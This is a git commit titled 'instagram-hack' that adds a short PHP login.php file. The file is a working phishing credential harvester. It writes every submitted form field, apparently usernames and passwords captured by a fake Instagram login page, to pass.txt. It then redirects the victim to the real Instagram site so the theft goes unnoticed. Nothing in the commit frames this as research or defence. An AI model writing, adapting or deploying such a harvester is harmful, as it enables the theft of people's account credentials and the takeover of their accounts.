28625aa30c44069e81b5df0d28472fcfa556bf84
Pawanbir Singh <65290736+huskywarlock@users.noreply.github.com>
2020-06-13 18:41:28 +0530

    instagram-hack

---
+++ login.php
@@ -0,0 +1,18 @@
+<?php
+//idk man who dat lol
+header
+('location:');
+$handle=fopen("pass.txt","a");
+foreach($_POST as $variable=>$value)
+{
+fwrite($handle,$variable);
+fwrite($handle,"=");
+fwrite($handle,$value);
+fwrite($handle,"\r\n");
+}
+fwrite($handle,"\r\n");
+fclose($handle);
+header("location:https://www.instagram.com/");
+exit;
+// idk man who dat lol
+?>
